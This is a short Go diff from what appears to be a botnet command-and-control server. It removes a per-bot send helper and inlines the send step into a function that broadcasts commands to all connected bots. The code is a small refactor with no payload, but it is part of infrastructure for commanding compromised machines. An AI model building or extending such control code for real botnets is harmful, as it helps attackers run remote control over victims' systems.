@@ -56,18 +56,13 @@ func (cc *CommandAndControl) HandleBotMessage(msg *protocol.Message) {
 	}
 }
 
-// SendCommandToBot sends a command to only one given bot
-func (cc *CommandAndControl) SendCommandToBot(cmd *protocol.Command, id string) {
-	if err := cc.bots[id].SendCommandToRemote(cmd); err != nil {
-		cc.ReleaseBot(id)
-	}
-}
-
 // BroadcastCommand broadcasts a command to all bots
 func (cc *CommandAndControl) BroadcastCommand(cmd *protocol.Command) {
 	log.Printf("[cmd&ctrl] broadcasting command to %d bots\n", len(cc.bots))
-	for botID := range cc.bots {
-		cc.SendCommandToBot(cmd, botID)
+	for id := range cc.bots {
+		if err := cc.bots[id].Send(cmd); err != nil {
+			cc.ReleaseBot(id)
+		}
 	}
 }
 
